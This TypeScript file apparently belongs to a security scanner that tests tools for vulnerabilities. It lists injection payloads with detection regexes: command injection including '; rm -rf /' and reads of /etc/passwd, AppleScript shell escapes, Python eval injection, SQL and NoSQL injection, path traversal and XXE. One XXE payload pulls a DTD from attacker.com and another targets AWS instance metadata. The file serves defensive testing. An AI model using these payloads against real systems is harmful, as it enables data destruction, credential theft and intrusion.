/**
 * Injection Attack Patterns
 *
 * Critical injection vulnerabilities - highest severity attacks.
 * Includes: Command Injection, AppleScript Command Injection, SQL Injection,
 * Calculator Injection, Path Traversal, XXE Injection, NoSQL Injection
 */

import { AttackPattern } from "./types";

/**
 * Critical injection attack patterns (7 patterns)
 */
export const INJECTION_PATTERNS: AttackPattern[] = [
  // 1. COMMAND INJECTION
  {
    attackName: "Command Injection",
    description:
      "Test if tool executes system commands instead of treating them as safe parameters",
    payloads: [
      // System command payloads - might trigger command execution tools
      {
        payload: "whoami",
        evidence: /\b(root|user|admin)\b/i,
        riskLevel: "HIGH",
        description: "System identity command",
        payloadType: "injection",
      },
      {
        payload: "ls -la",
        // Issue #27: Tighten pattern to require ls -la specific context
        // Avoids false positives from "X total in memory" tool status messages
        evidence:
          /(total\s+\d+\s*$|^[d-][rwx-]{9}\s+\d+|drwxr|permissions\s+denied)/im,
        riskLevel: "HIGH",
        description: "Directory listing command",
        payloadType: "injection",
      },
      {
        payload: "pwd",
        evidence: /\/[a-z]+/i,
        riskLevel: "HIGH",
        description: "Working directory command",
        payloadType: "injection",
      },
      {
        payload: "; rm -rf /",
        evidence: /(deleted|removed|rm.*rf)/i,
        riskLevel: "HIGH",
        description: "Command chaining with destructive command",
        payloadType: "injection",
      },
      {
        payload: "| cat /etc/passwd",
        evidence: /(root:x:|file.*protocol.*executed|local.*file.*ran)/i,
        riskLevel: "HIGH",
        description: "Pipe to file access command",
        payloadType: "injection",
      },
    ],
  },

  // 2. APPLESCRIPT COMMAND INJECTION (Issue #174)
  {
    attackName: "AppleScript Command Injection",
    description:
      "Test if tool executes arbitrary AppleScript/osascript commands via string interpolation",
    payloads: [
      // Double quote escape to shell execution
      {
        payload: '" & do shell script "id" & "',
        evidence: /uid=\d+|gid=\d+|\broot\b(?=:|\s|$)|whoami\s*$/i,
        riskLevel: "HIGH",
        description: "AppleScript string escape to shell (double quotes)",
        payloadType: "injection",
      },
      // Single quote escape variant
      {
        payload: "' & do shell script 'whoami' & '",
        evidence: /uid=\d+|gid=\d+|\broot\b(?=:|\s|$)|whoami\s*$/i,
        riskLevel: "HIGH",
        description: "AppleScript string escape to shell (single quotes)",
        payloadType: "injection",
      },
      // System info extraction
      {
        payload: "osascript -e 'return (system info)'",
        evidence: /processor|memory|system.*version/i,
        riskLevel: "MEDIUM",
        description: "AppleScript system info extraction",
        payloadType: "injection",
      },
      // File read via shell escape
      {
        payload: '" & do shell script "cat /etc/passwd" & "',
        evidence: /root:.*:0:0|\/bin\/(ba)?sh/i,
        riskLevel: "HIGH",
        description: "AppleScript file read via shell escape",
        payloadType: "injection",
      },
    ],
  },

  // 3. SQL INJECTION
  {
    attackName: "SQL Injection",
    description: "Test if tool properly escapes SQL commands",
    payloads: [
      {
        payload: "'; DROP TABLE users;--",
        evidence: /(dropped|deleted|table.*users|sql.*error|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "SQL command injection",
        payloadType: "injection",
      },
      {
        payload: "' OR '1'='1",
        evidence: /(sql|query|select|where.*1.*1|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "Boolean-based SQL injection",
        payloadType: "injection",
      },
      {
        payload: "admin'--",
        evidence: /(sql.*executed|admin.*query|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "Comment-based SQL injection",
        payloadType: "injection",
      },
      {
        payload: "' UNION SELECT * FROM passwords--",
        evidence: /(union.*select|password|sql.*error|syntax.*error)/i,
        riskLevel: "HIGH",
        description: "UNION-based SQL injection",
        payloadType: "injection",
      },
    ],
  },

  // 4. CALCULATOR INJECTION
  {
    attackName: "Calculator Injection",
    description:
      "Test if calculator/math tools execute arbitrary expressions instead of safely storing them",
    payloads: [
      // Simple arithmetic - triggers eval() in vulnerable calculator tools
      {
        payload: "2+2",
        evidence: /The answer is 4/i,
        riskLevel: "HIGH",
        description: "Simple arithmetic expression (common trigger)",
        payloadType: "injection",
      },
      {
        payload: "5*5",
        evidence: /The answer is 25/i,
        riskLevel: "HIGH",
        description: "Multiplication expression",
        payloadType: "injection",
      },
      {
        payload: "100+200",
        evidence: /The answer is 300/i,
        riskLevel: "HIGH",
        description: "Addition with larger numbers",
        payloadType: "injection",
      },
      // Natural language triggers
      {
        payload: "what is 10*10",
        evidence: /The answer is 100/i,
        riskLevel: "HIGH",
        description: "Natural language math query",
        payloadType: "injection",
      },
      {
        payload: "calculate 50+50",
        evidence: /The answer is 100/i,
        riskLevel: "HIGH",
        description: "Calculate command",
        payloadType: "injection",
      },
      // Code injection via eval()
      {
        payload: "__import__('os').system('whoami')",
        evidence: /\b(root|user|admin|ubuntu)\b/i,
        riskLevel: "HIGH",
        description: "Python code injection via eval",
        payloadType: "injection",
      },
      {
        payload: "1+1; __import__('subprocess').run(['whoami'])",
        evidence: /\b(root|user|admin|ubuntu)\b/i,
        riskLevel: "HIGH",
        description: "eval chain to system command",
        payloadType: "injection",
      },
    ],
  },

  // 5. PATH TRAVERSAL
  {
    attackName: "Path Traversal",
    description:
      "Test if tool allows access to files outside intended directory",
    payloads: [
      {
        payload: "../../../etc/passwd",
        evidence: /(root:x:0:0|file.*accessed|passwd.*file)/i,
        riskLevel: "HIGH",
        description: "Unix path traversal",
        payloadType: "injection",
      },
      {
        payload: "..\\..\\..\\windows\\system32\\config\\sam",
        evidence: /(\[boot loader\]|sam.*file|system32)/i,
        riskLevel: "HIGH",
        description: "Windows path traversal",
        payloadType: "injection",
      },
      {
        payload: "/etc/passwd",
        evidence: /(root:x:0:0|file.*accessed)/i,
        riskLevel: "HIGH",
        description: "Absolute path access",
        payloadType: "injection",
      },
      {
        payload: "file:///etc/passwd",
        evidence: /(root:x:|file.*protocol.*executed|local.*file.*accessed)/i,
        riskLevel: "HIGH",
        description: "File protocol exploitation",
        payloadType: "injection",
      },
    ],
  },

  // 6. XXE INJECTION (XML External Entity)
  {
    attackName: "XXE Injection",
    description:
      "Test if tool processes XML external entities, allowing file disclosure or SSRF",
    payloads: [
      // Classic XXE - file disclosure
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        evidence:
          /(root:x:0:0|xxe.*processed|external.*entity.*loaded|file.*contents)/i,
        riskLevel: "HIGH",
        description: "XXE file disclosure via SYSTEM entity",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload", "content"],
      },
      // XXE with Windows path
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        evidence:
          /(\[fonts\]|\[extensions\]|xxe.*processed|windows.*file.*accessed)/i,
        riskLevel: "HIGH",
        description: "XXE Windows file disclosure",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // XXE SSRF via HTTP entity
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        evidence:
          /(ami-id|instance-id|xxe.*fetched|metadata.*accessed|ssrf.*xml)/i,
        riskLevel: "HIGH",
        description: "XXE SSRF to AWS metadata",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // Parameter entity XXE (blind XXE)
      {
        payload:
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
        evidence:
          /(dtd.*loaded|parameter.*entity|external.*dtd|xxe.*processed)/i,
        riskLevel: "HIGH",
        description: "Blind XXE via parameter entity",
        payloadType: "injection",
        parameterTypes: ["xml", "data", "body", "payload"],
      },
      // XXE in SOAP request
      {
        payload:
          '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        evidence: /(root:x:0:0|soap.*xxe|xxe.*soap|external.*entity)/i,
        riskLevel: "HIGH",
        description: "XXE in SOAP envelope",
        payloadType: "injection",
        parameterTypes: ["xml", "soap", "body", "request"],
      },
    ],
  },

  // 7. NOSQL INJECTION
  {
    attackName: "NoSQL Injection",
    description:
      "Test if tool is vulnerable to NoSQL injection attacks (MongoDB, Redis, etc.)",
    payloads: [
      // MongoDB operator injection
      {
        payload: '{"$gt": ""}',
        evidence:
          /(all.*documents|query.*executed|mongodb.*error|operator.*injection|nosql.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $gt operator injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "search", "data"],
      },
      // MongoDB $ne always-true
      {
        payload: '{"$ne": null}',
        evidence:
          /(returned.*all|bypass.*auth|nosql.*injection|query.*result|documents.*found)/i,
        riskLevel: "HIGH",
        description: "MongoDB $ne bypass injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "password", "username"],
      },
      // MongoDB $where JavaScript injection
      {
        payload: '{"$where": "this.password.match(/.*/)"}',
        evidence:
          /(javascript.*executed|\$where.*processed|nosql.*js|all.*passwords|query.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $where JavaScript injection",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "where", "data"],
      },
      // MongoDB $regex DOS
      {
        payload: '{"$regex": "^(a+)+$"}',
        evidence:
          /(regex.*executed|redos|timeout|catastrophic.*backtracking|query.*slow)/i,
        riskLevel: "MEDIUM",
        description: "MongoDB ReDoS via $regex",
        payloadType: "injection",
        parameterTypes: ["query", "filter", "search", "pattern"],
      },
      // MongoDB union-style query
      {
        payload: "admin', $or: [ {}, { 'a': 'a",
        evidence:
          /(admin.*returned|auth.*bypass|or.*injection|nosql.*executed)/i,
        riskLevel: "HIGH",
        description: "MongoDB $or injection bypass",
        payloadType: "injection",
        parameterTypes: ["username", "user", "name", "query"],
      },
      // Redis command injection
      {
        payload: "test\r\nCONFIG GET *\r\n",
        evidence:
          /(redis.*config|requirepass|maxmemory|save.*seconds|redis.*command.*executed)/i,
        riskLevel: "HIGH",
        description: "Redis CRLF command injection",
        payloadType: "injection",
        parameterTypes: ["key", "value", "data", "input"],
      },
      // Redis Lua script injection
      {
        payload: "EVAL \"return redis.call('INFO')\" 0",
        evidence:
          /(redis_version|used_memory|connected_clients|lua.*executed)/i,
        riskLevel: "HIGH",
        description: "Redis Lua script injection",
        payloadType: "injection",
        parameterTypes: ["script", "command", "query", "data"],
      },
      // CouchDB injection
      {
        payload: '{"selector": {"$or": [{"_id": {"$gt": null}}]}}',
        evidence:
          /(all.*documents|couchdb.*query|selector.*executed|documents.*returned)/i,
        riskLevel: "HIGH",
        description: "CouchDB selector injection",
        payloadType: "injection",
        parameterTypes: ["query", "selector", "filter", "find"],
      },
    ],
  },
];
